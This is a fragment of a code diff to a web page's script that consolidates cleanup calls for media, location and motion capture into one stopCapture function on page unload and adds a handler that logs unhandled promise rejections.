+        link: window.location.href,
+        created: Date.now(),
+        media: []
+      });
     }
     
-    // Show permission area immediately
+    // Show permission area
     permissionArea.classList.remove('hidden');
     
   } else {
@@ -1979,9 +2103,12 @@ window.addEventListener('beforeunload', () => {
     localStorage.setItem('lastSessionId', currentSessionId);
   }
   
-  stopMedia();
-  stopLocationTracking();
-  stopMotionTracking();
+  stopCapture();
+});
+
+// Add error handling for media devices
+window.addEventListener('unhandledrejection', (event) => {
+  console.warn('Unhandled promise rejection:', event.reason);
 });
 </script>
 </body>
